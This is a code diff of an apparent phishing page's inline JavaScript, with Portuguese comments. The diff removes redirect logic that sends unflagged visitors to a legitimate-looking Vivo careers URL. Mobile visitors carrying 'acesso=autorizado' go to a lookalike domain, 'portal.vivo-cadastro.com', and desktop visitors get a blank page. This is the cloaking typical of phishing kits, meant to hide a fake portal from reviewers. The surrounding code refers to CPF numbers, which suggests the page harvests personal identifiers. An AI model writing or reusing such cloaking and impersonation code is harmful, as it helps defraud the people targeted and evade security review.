@@ -27,36 +27,9 @@
                 return;
             }
             
-            // 2. Verificar se tem o parâmetro dashboard
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.get('dashboard') === 'true') {
-                window.location.href = '/dashboard';
-                return;
-            }
-            
-            // 3. Verificar se tem o parâmetro de acesso=autorizado
-            const hasAuthParam = urlParams.get('acesso') === 'autorizado';
-            
-            // 4. Verificar se é dispositivo móvel
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            
-            // 5. Determinar para onde redirecionar
-            let redirectUrl = 'https://atendimentovivo.gupy.io'; // URL padrão (não autorizado)
-            
-            if (hasAuthParam) {
-                // Se tem o parâmetro autorizado
-                if (isMobile) {
-                    // Em dispositivo móvel, vai para o domínio correto
-                    redirectUrl = 'https://portal.vivo-cadastro.com?acesso=autorizado';
-                } else {
-                    // Em desktop, vai para about:blank
-                    redirectUrl = 'about:blank';
-                }
-            }
-            
-            // 6. Fazer o redirecionamento
-            console.log('Redirecionando para:', redirectUrl, 'é móvel:', isMobile, 'é autorizado:', hasAuthParam);
-            window.location.href = redirectUrl;
+            // 2. Para qualquer outra rota sem CPF, redirecionar para página principal
+            console.log('Nenhum CPF encontrado, redirecionando para página principal');
+            window.location.href = '/dashboard';
         };
     </script>
 </head>
